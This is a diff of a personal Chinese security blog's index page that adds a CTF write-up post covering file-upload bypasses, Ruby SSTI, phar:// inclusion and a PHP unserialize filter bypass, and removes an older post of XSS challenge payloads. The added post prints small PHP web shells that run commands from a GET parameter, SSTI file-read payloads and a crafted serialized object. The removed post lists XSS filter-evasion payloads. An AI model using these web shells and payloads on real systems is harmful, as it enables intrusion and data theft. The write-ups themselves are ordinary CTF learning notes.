@@ -41,7 +41,7 @@
     <h2 class="author">Iuhrey</h2>
     <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
     <div class="count-box">
-      <a href="/archives"><div><strong>26</strong><br>文章</div></a>
+      <a href="/archives"><div><strong>27</strong><br>文章</div></a>
       <a href="/categories"><div><strong>2</strong><br>分类</div></a>
       <a href="/tags"><div><strong>12</strong><br>标签</div></a>
     </div>
@@ -68,6 +68,77 @@
 </div>
 
         <section id="main">
+  
+    <article id="post-近期比赛的归纳总结" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/11/18/近期比赛的归纳总结/" class="article-date">
+  <time class="post-time" datetime="2018-11-18T15:38:27.000Z" itemprop="datePublished">
+    <span class="post-month">11月</span><br>
+    <span class="post-day">18</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/11/18/近期比赛的归纳总结/">近期比赛的归纳总结</a>
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近比赛一波接一波，但是我又是忙着演出排练没时间打，好不容易抽出时间来比赛又被打的自闭又自闭，写个博客记录一下原来没注意过的小技巧和骚操作吧。</p>
+<h2 id="Easy-upload"><a href="#Easy-upload" class="headerlink" title="Easy_upload"></a>Easy_upload</h2><p>说来惭愧，这是新生赛的一道题目，真的学到了这个技巧。<br>打开页面是一个普通的界面，上传png文件发现了一个过滤：<br><img src="/images/21/1.png" alt=""><br>碰到这种过滤，我们可以使用phtml的文件来进行绕过，phtml文件可以把文件中存在html的标签进行处理再作为php文件执行，我们可以上传一个如下的phtml的文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;</span><br><span class="line">system($_GET[&apos;a&apos;]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
+<p>接着找到文件目录执行?a=cd ..;ls查看文件，读取flag.php就行了。</p>
+<h2 id="Crazy-Train"><a href="#Crazy-Train" class="headerlink" title="Crazy Train"></a>Crazy Train</h2><p>这题目真的学到了很多东西。这是一道关于Ruby的SSTI注入的题目，里面的技巧会慢慢讲。<br>打开网站发现只是一个简单的留言系统，只有一个新建文章的功能：<br><img src="/images/21/2.png" alt=""><br>点进去发现只有文章标题和文章内容可以编辑：<br><img src="/images/21/3.png" alt=""><br>emmmmm，一开始我是想尝试xss的，但是发现我们好像并不能确定文章是否传过去了，也不能确认是否有admin查看我们的文章，所以只能尝试其他思路…..抓包看看有没有可疑参数：<br><img src="/images/21/4.png" alt=""><br>发现了一个隐藏的参数，结合刚刚我们传文章过去无回显可以猜测一下是不是ssti注入，使用BuiltWith确定框架是Ruby，接着可以尝试一下如下攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 2 * 2 %&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/21/5.png" alt=""><br>接下来就简单多了，查了查Ruby的File类读文件调用方式，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">File.open(&apos;路径&apos;).read</span><br></pre></td></tr></table></figure></p>
+<p>尝试读取/etc/passwd:<br><img src="/images/21/6.png" alt=""><br>接下来的问题就是不知道我们所读取flag的路径在哪里，经过查阅Ruby有关dir类发现了这样一个函数：<br><img src="/images/21/7.png" alt=""><br>接下来就简单了，毕竟什么过滤也没有，操作如下：<br><img src="/images/21/8.png" alt=""><br><img src="/images/21/9.png" alt=""><br><img src="/images/21/10.png" alt=""></p>
+<h2 id="Archivr"><a href="#Archivr" class="headerlink" title="Archivr"></a>Archivr</h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>emmmmm，睡了一觉起来发现题目已经关了，真的无语，下一次尽量熬夜复现完吧。<br>点开链接发现是一个可以上传文件的系统，但是只能上传小于5kb的文件，上传文件会得到一个key，通过这个key能下载我们这个文件，不过链接的参数有一个可利用漏洞，文件包含：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fun.ritsec.club:8004/index.php?page=upload</span><br></pre></td></tr></table></figure></p>
+<p>利用文件包含漏洞就能读取出所有的源码，初步审计一波，我把有价值的给挑出来分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if ($_SERVER[&apos;REQUEST_METHOD&apos;] === &apos;POST&apos;) &#123;</span><br><span class="line">    if ($_FILES[&apos;upload&apos;][&apos;size&apos;] &gt; 5000) &#123; //max 5KB</span><br><span class="line">        die(&quot;File too large!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $filename = $_FILES[&apos;upload&apos;][&apos;name&apos;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    $upload_time = time();</span><br><span class="line">    $upload_dir = &quot;uploads/&quot; . md5($_SERVER[&apos;REMOTE_ADDR&apos;]) . &quot;/&quot;;</span><br><span class="line"></span><br><span class="line">    $ext = &quot;&quot;;</span><br><span class="line">    if (strpos($filename, &apos;.&apos;) !== false) &#123;</span><br><span class="line">        $f_ext = explode(&quot;.&quot;, $filename)[1];</span><br><span class="line">        if (ctype_alnum($f_ext) &amp;&amp; stripos($f_ext, &quot;php&quot;) === false &amp;&amp; stripos($f_ext, &quot;pht&quot;) === false) &#123;</span><br><span class="line">            $ext = &quot;.&quot; . $f_ext;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            $ext = &quot;.dat&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $ext = &quot;.dat&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $upload_path = $upload_dir . md5($upload_time) . $ext;</span><br><span class="line">    mkdir($upload_dir, 0770, true);</span><br><span class="line"></span><br><span class="line">    //Enforce maximum of 10 files</span><br><span class="line">    $dir = new DirLister($upload_dir);</span><br><span class="line">    if ($dir-&gt;getCount() &gt;= 10) &#123;</span><br><span class="line">        unlink($upload_dir . $dir-&gt;getOldestFile());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    move_uploaded_file($_FILES[&apos;upload&apos;][&apos;tmp_name&apos;], $upload_path);</span><br><span class="line">    $key = $upload_time . $ext;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这里给了上传文件的储存目录生成方式，以及两个黑名单，通过检查php?或者pht?来过滤文件的后缀名。目录通过获取我们的ip地址以及当前的时间戳来生成最终地址。  </p>
+<h3 id="phar协议"><a href="#phar协议" class="headerlink" title="phar协议"></a>phar协议</h3><p>题目过滤了php，php5，phtml等等，通过用一些后缀名来绕过貌似行不通，这里用到了一种协议-phar协议。<br>phar协议适用于php&gt;5.3.0版本，官方文档如下：<br><img src="/images/21/11.png" alt=""><br>简单来说，就是一个打包解包的过程，在我们传输压缩文件的时候，服务器会对压缩包进行解压然后执行文件内容，也就是说我们可以利用phar协议去解析我们上传的压缩包，例如：<br>我们新建一个php文件如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo system($_GET[&quot;a&quot;]); ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>将它压缩为zip文件，然后上传使用phar协议去读取../../xxx.zip/xxx.php就能执行任意命令了。 </p>
+<h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>一般来说，我们通过外网的服务器去请求内网数据的时候，外网的代理服务器就像一个跳板一样，让我们通过它去访问内网的服务器，正向代理的服务器作用也仅仅是作为跳板，但是反向代理不一样，我们访问反向代理服务器，代理服务器会通过自己的ip去访问内网服务器，然后将接受的信息返回给我们，反向代理服务器对外表现就像是一个内网服务器一样。具体分析可以参考：<br><a href="https://www.cnblogs.com/Anker/p/6056540.html" target="_blank" rel="noopener">https://www.cnblogs.com/Anker/p/6056540.html</a>  </p>
+<h3 id="解题方法"><a href="#解题方法" class="headerlink" title="解题方法"></a>解题方法</h3><p>既然我们可以通过phar协议去执行命令，那么现在问题就是如何找到目录，我们在源码中看到了服务器会将我们的ip进行md5然后加上当前时间戳的md5加后缀名来生成路径，但是在我加密了我的ip，去访问路径的时候发现返回了404，这就很奇怪，按理来说应该没问题，但是目录不存在是怎么回事？<br>这就是反向代理的原因了，我们访问的服务器是一个代理服务器，而我们所要的资源则是在内网服务器上，所以代理服务器在访问内网资源时，所用的ip就是它本身ip，并不是我们自身的ip，那问题又来了，我们如何得到服务器ip呢？<br>一个大师傅想到了所有的题目都是部署在一个服务器上，那么可以通过其他的题目来获取ip地址啊，例如上一题的Ruby SSTI注入，我们可以获取所有环境变量的信息：<br><img src="/images/21/12.png" alt=""><br><img src="/images/21/13.png" alt=""><br>通过request类来读取服务器ip:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@_request.instance_variable_get(:env)</span><br></pre></td></tr></table></figure></p>
+<p><img src="/images/21/14.png" alt=""><br>上传zip文件，接着访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://fun.ritsec.club:8004/uploads/98d3cbed97b0bc491c000455c9f8e6fb/md5(time()).zip/1.php?a=ls</span><br></pre></td></tr></table></figure></p>
+<p>读flag文件就行了。  </p>
+<h2 id="php-is-funny-chal8"><a href="#php-is-funny-chal8" class="headerlink" title="php_is_funny_chal8"></a>php_is_funny_chal8</h2><p>最近刷题接触到了几道反序列化问题，发现有道题目还是挺好的，补充了一个新的知识点。<br>题目点开扫目录，发现了一个index.php.bak，审计一波代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;open_basedir&quot;,dirname(__FILE__));</span><br><span class="line">#GOAL: file_get_content(&apos;sbztz.php&apos;)    : )</span><br><span class="line">   </span><br><span class="line">    class just4fun &#123;</span><br><span class="line">        public $filename;</span><br><span class="line">   </span><br><span class="line">        function __toString() &#123;</span><br><span class="line">            return @file_get_contents($this-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    $data = stripslashes($_GET[&apos;data&apos;]);</span><br><span class="line">    if (!$data) &#123;</span><br><span class="line">        die(&quot;hello from y&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    $token = $data[0];</span><br><span class="line">    $pass = true; </span><br><span class="line">   </span><br><span class="line">    switch ( $token ) &#123;</span><br><span class="line">        case &apos;a&apos; :</span><br><span class="line">        case &apos;O&apos; :</span><br><span class="line">        case &apos;b&apos; :</span><br><span class="line">        case &apos;i&apos; :</span><br><span class="line">        case &apos;d&apos; :</span><br><span class="line">            $pass = ! (bool) preg_match( &quot;/^&#123;$token&#125;:[0-9]+:/s&quot;, $data );</span><br><span class="line">            break;</span><br><span class="line">   </span><br><span class="line">        default:</span><br><span class="line">            $pass = false;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    if (!$pass) &#123;</span><br><span class="line">      die(&quot;TKS L.N.&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    echo unserialize($data);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- ./challenge8.php.bak --&gt;</span><br></pre></td></tr></table></figure></p>
+<p>题目要求就是让我们把sbztz.php给包含出，源码给出了一个类，类里面有一个__toString()函数，只要我们通过序列化触发类里面的函数就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">class just4fun &#123;</span><br><span class="line">    public $filename;</span><br><span class="line"></span><br><span class="line">    function __toString() &#123;</span><br><span class="line">        return @file_get_contents($this-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new just4fun(&quot;a&quot;);</span><br><span class="line">$a-&gt;filename = &quot;sbztz.php&quot;;</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>但是源码有一个过滤需要绕过:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$token = $data[0];</span><br><span class="line">    $pass = true; </span><br><span class="line">   </span><br><span class="line">    switch ( $token ) &#123;</span><br><span class="line">        case &apos;a&apos; :</span><br><span class="line">        case &apos;O&apos; :</span><br><span class="line">        case &apos;b&apos; :</span><br><span class="line">        case &apos;i&apos; :</span><br><span class="line">        case &apos;d&apos; :</span><br><span class="line">            $pass = ! (bool) preg_match( &quot;/^&#123;$token&#125;:[0-9]+:/s&quot;, $data );</span><br><span class="line">            break;</span><br><span class="line">   </span><br><span class="line">        default:</span><br><span class="line">            $pass = false;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    if (!$pass) &#123;</span><br><span class="line">      die(&quot;TKS L.N.&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
+<p>emmm，也就是说我们输入的data不能是例如开头为<strong>O:123:</strong>这种类型的，这里提供了一种比较特殊的绕过方式，分析可以看这篇文章:<a href="http://www.phpbug.cn/archives/32.html。" target="_blank" rel="noopener">http://www.phpbug.cn/archives/32.html。</a><br>里面提到了在我们生成:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+8:&quot;just4fun&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;sbztz.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>这个payload，在Object后加个+依旧可以正常的反序列化，所以最终payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:+8:&quot;just4fun&quot;:1:&#123;s:8:&quot;filename&quot;;s:9:&quot;sbztz.php&quot;;&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>PS:直接传参还不行，必须对符号都进行url编码才能得到flag，具体原因不太清楚.</strong></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2018/11/18/近期比赛的归纳总结/" data-id="cjopao6hl001wlsvjnslry4q8" class="article-share-link">分享</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
   
     <article id="post-结合CVE的一道命令执行弹shell的题目" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
   <div class="article-meta">
@@ -120,7 +191,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/11/01/结合CVE的一道命令执行弹shell的题目/" data-id="cjo725jd5001mqgvjwjrzkks5" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/11/01/结合CVE的一道命令执行弹shell的题目/" data-id="cjopao6h6001hlsvjqzu3v2yz" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>
@@ -214,7 +285,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/15/近期比赛学习总结/" data-id="cjo725jdg0025qgvjpwu2quu9" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/15/近期比赛学习总结/" data-id="cjopao6hl0025lsvjxwi5htc0" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
@@ -280,7 +351,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjo725jdg0020qgvjf6sw8ko8" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/10/08/关于命令执行的学习/" data-id="cjopao6hl001qlsvjqm1v00cf" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/命令执行/">命令执行</a></li></ul>
@@ -355,7 +426,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjo725jdg001tqgvjg19mlaxp" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/09/27/绕过过滤getshell的一些骚操作/" data-id="cjopao6hl001tlsvj77zmpzfm" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Getshell/">Getshell</a></li></ul>
@@ -419,7 +490,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjo725jco000tqgvj4jox0g6e" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/08/16/solve-me-后续/" data-id="cjopao6fv000rlsvj360xiunw" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
@@ -492,7 +563,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjo725jdd001pqgvj5lhvwcds" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/08/02/关于代码审计的一些绕过方式/" data-id="cjopao6hl0022lsvjwlgrk0dl" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/代码审计/">代码审计</a></li></ul>
@@ -551,7 +622,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjo725jdg0023qgvjue23it9r" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/22/近期比赛学习到的一些知识/" data-id="cjopao6hl001nlsvj3xnp3iw1" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/比赛心得/">比赛心得</a></li></ul>
@@ -618,7 +689,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjo725jco0013qgvjo9fi4vip" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/07/15/一次靶场的注入实战/" data-id="cjopao6gq0011lsvjsauagr1p" class="article-share-link">分享</a>
       
       
   <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>
@@ -685,77 +756,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/07/13/xss挑战赛的Payload-下/" data-id="cjo725jd5001eqgvj3wk4z72w" class="article-share-link">分享</a>
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-  
-    <article id="post-xss挑战赛的Payload(上)" class="wow slideInRight article article-type-post" itemscope="" itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/07/10/xss挑战赛的Payload(上)/" class="article-date">
-  <time class="post-time" datetime="2018-07-10T11:02:27.000Z" itemprop="datePublished">
-    <span class="post-month">7月</span><br>
-    <span class="post-day">10</span>
-  </time>
-</a>
-   
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/07/10/xss挑战赛的Payload(上)/">xss挑战赛的Payload(上)</a>
-    </h1>
-  
-
-        <div>
-          
-          
-              
-
-          
-        </div>
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>日常开头，塔主在之前弄了一个XSS的专题，里面大致介绍了XSS攻击的一些要领以及给了我们一个XSS接收平台。，为了练习呢，有人推荐了这个<strong>xss.tv</strong>，里面有共计20道题目，所以我打算归纳一下Payload，随便总结一下bypass的思路。  </p>
-<h2 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h2><p><img src="/images/14/1.png" alt=""><br>打开XSS挑战赛的地址，发现第一题很明显是Get型的传参方式。试试最为基础的，也是作为测试的Payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
-<p>很容易过关跳转到第二关。</p>
-<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>审查元素<br><img src="/images/14/2.png" alt=""><br>发现输入的字符被嵌入进了<strong>value=””</strong>，可以考虑闭合构造弹出提示框，然后注释掉后面的内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; //</span><br></pre></td></tr></table></figure></p>
-<h2 id="level-3"><a href="#level-3" class="headerlink" title="level 3"></a>level 3</h2><p>测试一下发现在文本框输入<strong>‘</strong>是无法回显的，审查元素发现如下。<br><img src="/images/14/3.png" alt=""><br>针对这个为啥输入了一个’，源码就变成这样我还特地问了问前端狗大黄，这可能是浏览器的问题。我特地试试了几个不同的浏览器，发现输入相同，但是网站的源码并不一致，所以为了学好XSS，我就一直用一个特定的浏览器firefox。<br>接着测试一下’a’b确定输入的内容如何嵌入网站源码。<br><img src="/images/14/4.png" alt=""><br>那就照猫画虎构造Payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;onclick=alert(1)&gt;&apos;</span><br></pre></td></tr></table></figure>
-<p>源码就变为了</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(1)&gt;&apos;&apos;&quot;</span><br></pre></td></tr></table></figure>
-<p>这里由于浏览器解析问题这一段就直接解析成了一个事件，点击一下文本框就弹窗了。<br><strong>PS:具体原理我也搞不懂是为啥，问了前端狗也无果</strong></p>
-<h2 id="level-4"><a href="#level-4" class="headerlink" title="level 4"></a>level 4</h2><p>这一题和上一题类似，就是把<strong>‘</strong>换成了<strong>“</strong>，试着输入Payload。<br><img src="/images/14/5.png" alt=""><br>发现回显出现了一个问题就是<strong>&gt;</strong>被吞了，既然这样我们可以试试实体编码<strong>&amp;gt</strong>来绕过。<br>点击文本框即可弹窗。  </p>
-<h2 id="level-5"><a href="#level-5" class="headerlink" title="level 5"></a>level 5</h2><p>这题目多了一个难点就是on被强制转化为了o_n，就说明某些事件标签就不可以用了，但是可以换一个思路来构造xss的Payload，既然on不能用了，那我们试试a，href标签，构造<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;clickme&lt;&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/14/6.png" alt=""><br>发现a标签被解析了，只要点击后面的clickme就能执行javascript伪协议后面的内容。</p>
-<h2 id="level-6"><a href="#level-6" class="headerlink" title="level 6"></a>level 6</h2><p>这一关相比较第五关就是过滤了href，目前过滤了on，script，href这三个关键词，我们可以尝试使用大小写来进行绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;sCript&gt;alert(1)&lt;/sCript&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p>
-<h2 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h2><p>这题目初步测试发现关键词on，script，src，href等关键词都被过滤了，无法回显我们输入的关键词，那么可以试试双写来绕过。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;scrscriptipt&gt;alert(1)&lt;/scrscriptipt&gt;&lt;&quot;</span><br></pre></td></tr></table></figure></p>
-<h2 id="level-8"><a href="#level-8" class="headerlink" title="level 8"></a>level 8</h2><p>这一题过滤了很多东西，大写被自动转义成了小写，一些关键词中间都被强加了<strong>_</strong>，我们可以推测前端获取了信息返回给后端，后端是经过了一定处理的，所以呢，我们只要避开后端的检测就行了，这里可以使用实体编码来绕过，因为在后端是无法解析实体编码的，只有在前端页面才能进行解析，所以我们可以用实体编码来构造payload。<br>解决这个问题，再次观察题目发现我们输入的payload会被网页添加到<strong>a href</strong>标签中，所以我们最后的payload为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)</span><br></pre></td></tr></table></figure></p>
-<p><img src="/images/14/7.png" alt=""></p>
-<h2 id="level-9"><a href="#level-9" class="headerlink" title="level 9"></a>level 9</h2><p>说实话一开始我毫无头绪，测试了很多发现都无法改变友链的内容，知道看到解析才知道，原来合法链接的意思是要加上<strong>http://</strong>，这样就好构造了，把后面的<strong>http://</strong>注释掉就行了，payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;:alert(1)//http://</span><br></pre></td></tr></table></figure></p>
-<h2 id="level-10"><a href="#level-10" class="headerlink" title="level 10"></a>level 10</h2><p>点进去发现什么都没给,但查看源码发现<br><img src="/images/14/8.png" alt=""><br>输入框被隐藏了，所以可以直接通过get把参数传过去，不过在测试的时候发现只有<strong>t_sort</strong>这个参数传过去才能更改源码。<br>不过测试发现<strong>&lt;&gt;</strong>这个标签被过滤了，并且我在尝试使用<strong>&amp;lt,&amp;gt</strong>绕过时发现，不仅左右括号被吞了，连内容也被吞了，不过好在on有用，构造如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://daka.whaledu.com/xss/level10.php?t_sort=&quot; type=&quot;button&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure></p>
-<p>最终的解析为<br><img src="/images/14/9.png" alt=""></p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>由于考试周加上一些烦躁的事情要处理，博客没来得及更新，接下来博客会很勤的写。</p>
-
-      
-    </div>
-    <footer class="article-footer">
